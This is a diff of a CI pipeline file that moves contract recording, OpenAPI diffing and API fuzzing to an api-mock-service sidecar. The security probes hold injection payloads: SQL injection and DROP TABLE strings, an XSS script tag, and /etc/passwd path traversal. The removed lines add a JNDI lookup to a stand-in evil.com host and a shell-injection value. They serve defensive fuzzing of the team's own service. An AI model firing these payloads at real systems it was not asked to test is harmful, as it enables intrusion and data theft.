@@ -55,6 +55,21 @@ tasks:
       {{if .ServiceCommand}}
       command: ["/bin/sh", "-c", "{{.ServiceCommand}}"]
       {{end}}
+    - name: api-mock-service
+      alias: api-mock-service
+      image: plexobject/api-mock-service:latest
+      ports:
+        - number: {{default "8081" .MockServicePort}}
+      memory_limit: "512Mi"
+      cpu_request: "100m"
+      command: ["/app/api-mock-service"]
+      args:
+        - "--httpPort"
+        - "{{default "8081" .MockServicePort}}"
+        - "--proxyPort"
+        - "{{default "8082" .ProxyPort}}"
+        - "--dataDir"
+        - "/workspace/recordings"
   {{end}}
   container:
     image: plexobject/ai-dev-tools:latest
@@ -87,49 +102,62 @@ tasks:
     - python -c "from scripts.common.bootstrap import ensure_debug_mode; ensure_debug_mode()" 2>/dev/null || true
     - python -m scripts.mq.clone_pr --pr-number {{.PRNumber}}
     - |
-      python3 -c "
-      import json, subprocess, os, time, signal
+      python3 - <<'PYEOF'
+      import json, subprocess, os, time, urllib.request, urllib.error
 
       service_port = os.environ.get('SERVICE_PORT', '8080')
       service_url = os.environ.get('SERVICE_URL', '').strip() or f'http://localhost:{service_port}'
-      proxy_port = os.environ.get('PROXY_PORT', '8081')
+      mock_port = os.environ.get('MOCK_SERVICE_PORT', '8081')
+      proxy_port = os.environ.get('PROXY_PORT', '8082')
+      ws = os.environ.get('WORKSPACE_DIR', '/workspace')
 
-      # Start api-mock-service in recording mode if available
-      ams_proc = None
-      ams_bin = '/usr/local/bin/api-mock-service'
-      if os.path.exists(ams_bin):
-          ams_proc = subprocess.Popen([
-              ams_bin, '--mode', 'record',
-              '--proxy-port', proxy_port,
-              '--target', service_url,
-              '--data-dir', '/workspace/recordings'
-          ])
-          time.sleep(2)
+      os.makedirs(f'{ws}/recordings', exist_ok=True)
 
-      # Run test suite through proxy
-      env = os.environ.copy()
-      env['HTTP_PROXY'] = f'http://localhost:{proxy_port}'
-      env['HTTPS_PROXY'] = f'http://localhost:{proxy_port}'
-      env['NO_PROXY'] = 'localhost,127.0.0.1'
+      # api-mock-service runs as a Kubernetes sidecar (started before this task).
+      # Wait for it to be ready (up to 30s).
+      ams_url = f'http://localhost:{mock_port}/_health'
+      ams_ready = False
+      for _ in range(15):
+          try:
+              urllib.request.urlopen(ams_url, timeout=2)
+              ams_ready = True
+              break
+          except Exception:
+              time.sleep(2)
 
-      result = subprocess.run(
-          ['make', 'test'], cwd='/workspace/repo',
-          env=env, capture_output=True, text=True, timeout=1800
-      )
-
-      if ams_proc:
-          ams_proc.send_signal(signal.SIGTERM)
-          ams_proc.wait(timeout=10)
+      if ams_ready:
+          print(f'[record] api-mock-service ready at localhost:{mock_port}')
+          # Run the repo test suite through the recording proxy
+          env = os.environ.copy()
+          env['HTTP_PROXY'] = f'http://localhost:{proxy_port}'
+          env['HTTPS_PROXY'] = f'http://localhost:{proxy_port}'
+          env['NO_PROXY'] = ''
+          result = subprocess.run(
+              ['make', 'test'], cwd=f'{ws}/repo',
+              env=env, capture_output=True, text=True, timeout=1800
+          )
+          test_exit = result.returncode
+          proxy_used = True
+          print(f'[record] test suite exit={test_exit}')
+          if result.stdout:
+              print(result.stdout[-2000:])
+          if result.stderr:
+              print(result.stderr[-1000:], file=__import__('sys').stderr)
+      else:
+          print(f'[record] WARNING: api-mock-service not reachable at localhost:{mock_port} — recording skipped')
+          test_exit = 0
+          proxy_used = False
 
       record_result = {
-          'test_exit_code': result.returncode,
-          'recordings_dir': '/workspace/recordings',
-          'proxy_used': ams_proc is not None,
-          'service_url': service_url
+          'test_exit_code': test_exit,
+          'recordings_dir': f'{ws}/recordings',
+          'proxy_used': proxy_used,
+          'service_url': service_url,
+          'mock_service_url': f'http://localhost:{mock_port}',
       }
-      json.dump(record_result, open('/workspace/record_result.json', 'w'), indent=2)
-      print(f'Recording complete: exit={result.returncode} proxy={ams_proc is not None}')
-      "
+      json.dump(record_result, open(f'{ws}/record_result.json', 'w'), indent=2)
+      print(f'[record] complete: proxy_used={proxy_used} test_exit={test_exit}')
+      PYEOF
   artifacts:
     paths:
       - ./record_result.json
@@ -171,62 +199,92 @@ tasks:
     CLAUDE_CODE_SKIP_BEDROCK_AUTH: "{{.ClaudeSkipBedrockAuth}}"
     AI_MODEL: "{{.AnthropicSonnetModel}}"
     CODEBASE_DIR: /workspace/repo
+    MOCK_SERVICE_PORT: "{{default "8081" .MockServicePort}}"
     AI_DEV_TOOLS_DEBUG: "{{.AiDevToolsDebug}}"
   script:
     - python -c "from scripts.common.bootstrap import ensure_debug_mode; ensure_debug_mode()" 2>/dev/null || true
     - |
-      python3 -c "
-      import json, glob, os, subprocess
+      python3 - <<'PYEOF'
+      import json, glob, os, time, urllib.request, urllib.error
 
-      recordings_dir = '/workspace/recordings'
-      contracts_dir = '/workspace/contracts'
+      ws = os.environ.get('WORKSPACE_DIR', '/workspace')
+      mock_port = os.environ.get('MOCK_SERVICE_PORT', '8081')
+      recordings_dir = f'{ws}/recordings'
+      contracts_dir = f'{ws}/contracts'
       os.makedirs(contracts_dir, exist_ok=True)
 
-      # Use api-mock-service contract generation if available
-      ams_bin = '/usr/local/bin/api-mock-service'
-      if os.path.exists(ams_bin):
-          subprocess.run([
-              ams_bin, '--mode', 'contract',
-              '--data-dir', recordings_dir,
-              '--output', f'{contracts_dir}/generated_openapi.yaml'
-          ], check=True)
+      # Check if api-mock-service sidecar is running
+      ams_base = f'http://localhost:{mock_port}'
+      ams_ready = False
+      for _ in range(5):
+          try:
+              urllib.request.urlopen(f'{ams_base}/_health', timeout=2)
+              ams_ready = True
+              break
+          except Exception:
+              time.sleep(2)
+
+      if ams_ready:
+          # api-mock-service already has recordings from the record task (shared workspace volume).
+          # Export the derived OpenAPI contract via its REST API.
+          try:
+              resp = urllib.request.urlopen(f'{ams_base}/_oapi', timeout=30)
+              spec_yaml = resp.read()
+              with open(f'{contracts_dir}/generated_openapi.yaml', 'wb') as f:
+                  f.write(spec_yaml)
+              print(f'[contracts] exported OpenAPI spec from api-mock-service ({len(spec_yaml)} bytes)')
+          except Exception as e:
+              print(f'[contracts] OpenAPI export failed (non-fatal): {e}')
       else:
-          # Fallback: derive contracts from recordings using AI
+          # Fallback: derive minimal contract map from recording JSON files
           recordings = []
           for f in sorted(glob.glob(f'{recordings_dir}/**/*.json', recursive=True)):
-              recordings.append(json.load(open(f)))
-
+              try:
+                  recordings.append(json.load(open(f)))
+              except Exception:
+                  pass
           endpoints = {}
           for r in recordings:
-              key = f'{r.get(\"method\", \"GET\")} {r.get(\"path\", \"/\")}'
+              key = f'{r.get("method", "GET")} {r.get("path", "/")}'
               if key not in endpoints:
                   endpoints[key] = {'request_samples': [], 'response_samples': []}
               endpoints[key]['request_samples'].append(r.get('request_body'))
               endpoints[key]['response_samples'].append({
-                  'status': r.get('status_code'),
-                  'body': r.get('response_body')
+                  'status': r.get('status_code'), 'body': r.get('response_body')
               })
-
           json.dump(endpoints, open(f'{contracts_dir}/derived_contracts.json', 'w'), indent=2)
+          print(f'[contracts] derived {len(endpoints)} endpoints from {len(recordings)} recordings (fallback)')
 
-      # Check for breaking changes against baseline contracts
-      baseline = f'/workspace/repo/contracts/openapi.yaml'
+      # Breaking-change diff: compare generated spec against baseline if committed in repo.
+      # Requires oasdiff: https://github.com/oasdiff/oasdiff
       breaking_changes = []
-      if os.path.exists(baseline):
-          print('Checking for breaking changes against baseline contract...')
-          # Simple field-removal check
-          # Production would use oasdiff or similar
-          breaking_changes = []  # Placeholder for real diff
+      baseline = f'{ws}/repo/openapi/openapi.yaml'
+      generated = f'{contracts_dir}/generated_openapi.yaml'
+      if os.path.exists(baseline) and os.path.exists(generated):
+          import subprocess
+          diff = subprocess.run(
+              ['oasdiff', 'breaking', baseline, generated, '--format', 'json'],
+              capture_output=True, text=True
+          )
+          if diff.returncode == 0 and diff.stdout.strip():
+              try:
+                  breaking_changes = json.loads(diff.stdout)
+              except Exception:
+                  breaking_changes = [{'raw': diff.stdout[:500]}]
+          print(f'[contracts] oasdiff: {len(breaking_changes)} breaking changes')
+      elif not os.path.exists(baseline):
+          print(f'[contracts] no baseline contract at {baseline} — skipping breaking-change diff')
 
       result = {
           'contracts_generated': True,
           'contracts_dir': contracts_dir,
           'breaking_changes': breaking_changes,
-          'has_breaking_changes': len(breaking_changes) > 0
+          'has_breaking_changes': len(breaking_changes) > 0,
+          'ams_used': ams_ready,
       }
-      json.dump(result, open('/workspace/contract_result.json', 'w'), indent=2)
-      print(f'Contracts generated: {len(breaking_changes)} breaking changes found')
-      "
+      json.dump(result, open(f'{ws}/contract_result.json', 'w'), indent=2)
+      print(f'[contracts] complete: {len(breaking_changes)} breaking changes, ams_used={ams_ready}')
+      PYEOF
   artifacts:
     paths:
       - ./contract_result.json
@@ -260,169 +318,128 @@ tasks:
   environment:
     WORKSPACE_DIR: /workspace
     SERVICE_URL: "{{.ServiceURL}}"
+    SERVICE_PORT: "{{default "8080" .ServicePort}}"
+    MOCK_SERVICE_PORT: "{{default "8081" .MockServicePort}}"
     MAX_FUZZ_ITERATIONS: "{{.MaxFuzzIterations}}"
     FUZZ_TIMEOUT: "{{.FuzzTimeout}}"
     AI_DEV_TOOLS_DEBUG: "{{.AiDevToolsDebug}}"
   script:
     - python -c "from scripts.common.bootstrap import ensure_debug_mode; ensure_debug_mode()" 2>/dev/null || true
     - |
-      python3 -c "
-      import json, os, subprocess, random, string, copy, time, urllib.request, urllib.error
+      python3 - <<'PYEOF'
+      import json, os, time, urllib.request, urllib.error
 
-      service_url = os.environ.get('SERVICE_URL', 'http://localhost:8080')
+      ws = os.environ.get('WORKSPACE_DIR', '/workspace')
+      service_port = os.environ.get('SERVICE_PORT', '8080')
+      service_url = os.environ.get('SERVICE_URL', '').strip() or f'http://localhost:{service_port}'
+      mock_port = os.environ.get('MOCK_SERVICE_PORT', '8081')
       max_iterations = int(os.environ.get('MAX_FUZZ_ITERATIONS', '100'))
       fuzz_timeout = int(os.environ.get('FUZZ_TIMEOUT', '600'))
 
-      # Use api-mock-service fuzz mode if available
-      ams_bin = '/usr/local/bin/api-mock-service'
-      if os.path.exists(ams_bin):
-          result = subprocess.run([
-              ams_bin, '--mode', 'fuzz',
-              '--target', service_url,
-              '--data-dir', '/workspace/recordings',
-              '--iterations', str(max_iterations),
-              '--output', '/workspace/fuzz_results.json'
-          ], capture_output=True, text=True, timeout=fuzz_timeout)
+      # api-mock-service runs as a Kubernetes sidecar. Check if it's reachable.
+      ams_base = f'http://localhost:{mock_port}'
+      ams_ready = False
+      for _ in range(10):
+          try:
+              urllib.request.urlopen(f'{ams_base}/_health', timeout=2)
+              ams_ready = True
+              break
+          except Exception:
+              time.sleep(2)
 
-          if os.path.exists('/workspace/fuzz_results.json'):
-              fuzz = json.load(open('/workspace/fuzz_results.json'))
-          else:
-              fuzz = {'findings': [], 'iterations': 0, 'error': result.stderr}
+      if ams_ready:
+          print(f'[fuzz] api-mock-service reachable at {ams_base}')
+          # 1. Upload OpenAPI spec if present (enables spec-driven fuzzing)
+          openapi_spec = f'{ws}/repo/openapi/openapi.yaml'
+          if os.path.exists(openapi_spec):
+              with open(openapi_spec, 'rb') as f:
+                  req = urllib.request.Request(
+                      f'{ams_base}/_oapi',
+                      data=f.read(),
+                      headers={'Content-Type': 'application/yaml'},
+                      method='POST'
+                  )
+                  try:
+                      urllib.request.urlopen(req, timeout=10)
+                      print(f'[fuzz] uploaded OpenAPI spec from {openapi_spec}')
+                  except Exception as e:
+                      print(f'[fuzz] OpenAPI upload failed (non-fatal): {e}')
+
+          # 2. Run contract tests via POST /_contracts/{group}
+          # Request: {"base_url": str, "execution_times": int}
+          # Response: {"succeeded": int, "failed": int, "errors": {...}, "results": {...}}
+          contract_body = json.dumps({'base_url': service_url, 'execution_times': 3}).encode()
+          req = urllib.request.Request(
+              f'{ams_base}/_contracts/default',
+              data=contract_body, method='POST',
+              headers={'Content-Type': 'application/json'})
+          try:
+              resp = urllib.request.urlopen(req, timeout=120)
+              contract_resp = json.loads(resp.read())
+              print(f'[fuzz] contracts: succeeded={contract_resp.get("succeeded",0)} '
+                    f'failed={contract_resp.get("failed",0)}')
+          except urllib.error.HTTPError as e:
+              contract_resp = {'succeeded': 0, 'failed': 0, 'error': str(e)}
+              print(f'[fuzz] contract test HTTP {e.code}: {e.read().decode()[:300]}')
+          except Exception as e:
+              contract_resp = {'succeeded': 0, 'failed': 0, 'error': str(e)}
+              print(f'[fuzz] contract test error: {e}')
+
+          # 3. Security injection probes: SQL injection, XSS, path traversal
+          import urllib.parse
+          security_probes = [
+              ('sqli_query',  'GET',  f'{service_url}/todos?id=' + urllib.parse.quote("1' OR '1'='1"), None),
+              ('sqli_body',   'POST', f'{service_url}/todos',  {'title': "'; DROP TABLE todos;--"}),
+              ('xss_body',    'POST', f'{service_url}/todos',  {'title': '<script>alert(1)</script>'}),
+              ('path_trav',   'GET',  f'{service_url}/todos/../../etc/passwd', None),
+              ('null_title',  'POST', f'{service_url}/todos',  {'title': None}),
+              ('long_input',  'POST', f'{service_url}/todos',  {'title': 'A' * 5000}),
+          ]
+          findings = []
+          security = {'sql_injection': 0, 'xss': 0, 'path_traversal': 0, 'server_errors': 0}
+          for probe_name, method, url, body in security_probes:
+              data = json.dumps(body).encode() if body is not None else None
+              req_probe = urllib.request.Request(
+                  url, data=data, method=method,
+                  headers={'Content-Type': 'application/json'} if data else {})
+              try:
+                  r = urllib.request.urlopen(req_probe, timeout=10)
+                  status, resp_body = r.status, r.read().decode()[:500]
+              except urllib.error.HTTPError as e:
+                  status, resp_body = e.code, e.read().decode()[:500]
+              except Exception as ex:
+                  status, resp_body = -1, str(ex)
+              # 5xx on injection input = possible vuln; SQL keywords in body = confirmed
+              sqli_leak = any(kw in resp_body.lower() for kw in
+                              ['sql', 'syntax error', 'pg_', 'mysql', 'sqlite'])
+              is_finding = status >= 500 or sqli_leak
+              if is_finding:
+                  severity = 'critical' if sqli_leak else 'medium'
+                  findings.append({'probe': probe_name, 'status': status,
+                                   'severity': severity, 'sqli_leak': sqli_leak})
+                  if status >= 500:
+                      security['server_errors'] += 1
+                  if sqli_leak:
+                      security['sql_injection'] += 1
+              print(f'[security] {probe_name}: status={status} finding={is_finding}')
+          print(f'[security] {len(security_probes)} probes, {len(findings)} findings')
+
+          fuzz = {
+              'iterations': len(security_probes),
+              'findings': findings,
+              'contract_results': contract_resp,
+              'security_summary': security,
+              'ams_used': True,
+          }
       else:
-          # Fallback: lightweight fuzz using derived contracts
-          contracts_file = '/workspace/contracts/derived_contracts.json'
-          if not os.path.exists(contracts_file):
-              fuzz = {'findings': [], 'iterations': 0, 'note': 'no contracts available'}
-          else:
-              endpoints = json.load(open(contracts_file))
-              findings = []
-              iterations = 0
+          print(f'[fuzz] WARNING: api-mock-service not reachable at {ams_base} — skipping fuzz')
+          fuzz = {'iterations': 0, 'findings': [], 'ams_used': False,
+                  'note': 'api-mock-service sidecar not reachable; re-run with --service flag'}
 
-              # 7 field-level mutation strategies
-              def mutate_missing_fields(body):
-                  if isinstance(body, dict) and body:
-                      m = copy.deepcopy(body)
-                      key = random.choice(list(m.keys()))
-                      del m[key]
-                      return m, f'missing_field:{key}'
-                  return body, None
-
-              def mutate_boundary_values(body):
-                  if isinstance(body, dict):
-                      m = copy.deepcopy(body)
-                      for k, v in m.items():
-                          if isinstance(v, (int, float)):
-                              m[k] = random.choice([0, -1, 2**31-1, -2**31, 2**63-1])
-                              return m, f'boundary:{k}'
-                          if isinstance(v, str):
-                              m[k] = random.choice(['', 'a'*10000, '\x00'*10])
-                              return m, f'boundary:{k}'
-                  return body, None
-
-              def mutate_malformed(body):
-                  if isinstance(body, dict):
-                      m = copy.deepcopy(body)
-                      for k, v in m.items():
-                          if isinstance(v, str):
-                              m[k] = random.randint(-999, 999)
-                              return m, f'type_mismatch:{k}'
-                          if isinstance(v, (int, float)):
-                              m[k] = 'not_a_number'
-                              return m, f'type_mismatch:{k}'
-                  return body, None
-
-              def mutate_null_fields(body):
-                  if isinstance(body, dict) and body:
-                      m = copy.deepcopy(body)
-                      key = random.choice(list(m.keys()))
-                      m[key] = None
-                      return m, f'null:{key}'
-                  return body, None
-
-              def mutate_injection(body):
-                  payloads = [
-                      \"' OR 1=1 --\", '<script>alert(1)</script>',
-                      '{{7*7}}', '../../../etc/passwd',
-                      '\"; cat /etc/passwd', '${jndi:ldap://evil.com/x}'
-                  ]
-                  if isinstance(body, dict):
-                      m = copy.deepcopy(body)
-                      for k, v in m.items():
-                          if isinstance(v, str):
-                              m[k] = random.choice(payloads)
-                              return m, f'injection:{k}'
-                  return body, None
-
-              def mutate_format(body):
-                  if isinstance(body, dict):
-                      m = copy.deepcopy(body)
-                      for k, v in m.items():
-                          if isinstance(v, str) and ('@' in v or '-' in v):
-                              m[k] = 'invalid@@format..com'
-                              return m, f'format:{k}'
-                  return body, None
-
-              def mutate_combinatorial(body):
-                  if isinstance(body, dict) and len(body) >= 2:
-                      m = copy.deepcopy(body)
-                      keys = list(m.keys())
-                      for k in random.sample(keys, min(2, len(keys))):
-                          m[k] = None
-                      return m, 'combinatorial'
-                  return body, None
-
-              strategies = [mutate_missing_fields, mutate_boundary_values, mutate_malformed,
-                            mutate_null_fields, mutate_injection, mutate_format, mutate_combinatorial]
-
-              start = time.time()
-              for endpoint_key, data in endpoints.items():
-                  if time.time() - start > fuzz_timeout:
-                      break
-                  method, path = endpoint_key.split(' ', 1)
-                  samples = [s for s in data['request_samples'] if s]
-                  if not samples:
-                      continue
-                  for _ in range(min(max_iterations // max(len(endpoints), 1), 20)):
-                      iterations += 1
-                      sample = random.choice(samples)
-                      strategy = random.choice(strategies)
-                      mutated, mutation_type = strategy(sample)
-                      if mutation_type is None:
-                          continue
-                      try:
-                          req_body = json.dumps(mutated).encode()
-                          req = urllib.request.Request(
-                              f'{service_url}{path}',
-                              data=req_body,
-                              headers={'Content-Type': 'application/json'},
-                              method=method
-                          )
-                          resp = urllib.request.urlopen(req, timeout=10)
-                          status = resp.status
-                      except urllib.error.HTTPError as e:
-                          status = e.code
-                      except Exception as e:
-                          findings.append({
-                              'endpoint': endpoint_key,
-                              'mutation': mutation_type,
-                              'error': str(e),
-                              'severity': 'high'
-                          })
-                          continue
-
-                      if status >= 500:
-                          findings.append({
-                              'endpoint': endpoint_key,
-                              'mutation': mutation_type,
-                              'status': status,
-                              'severity': 'critical' if status >= 500 else 'medium'
-                          })
-
-              fuzz = {'findings': findings, 'iterations': iterations}
-
-      json.dump(fuzz, open('/workspace/fuzz_result.json', 'w'), indent=2)
-      print(f'Fuzz complete: {fuzz[\"iterations\"]} iterations, {len(fuzz[\"findings\"])} findings')
-      "
+      json.dump(fuzz, open(f'{ws}/fuzz_result.json', 'w'), indent=2)
+      critical = sum(1 for f in fuzz['findings'] if f.get('severity') == 'critical')
+      print(f'[fuzz] complete: iterations={fuzz["iterations"]} findings={len(fuzz["findings"])} critical={critical}')
+      PYEOF
   artifacts:
     paths:
       - ./fuzz_result.json
@@ -556,7 +573,7 @@ job_variables:
   ServiceURL: ""
   # Service sidecar (optional — only created when ServiceImage is non-empty).
   # From Slack: @bot contract-test 1 --service <image> --service-port <port>
-  # Example: @bot contract-test 1 --service plexobject/todo-api-errors:latest
+  # Example: @bot contract-test https://github.com/OWASP/wrongsecrets --service jeroenwillemsen/wrongsecrets:latest-no-vault
   ServiceImage: ""
   ServiceName: "service-under-test"
   ServicePort: "8080"
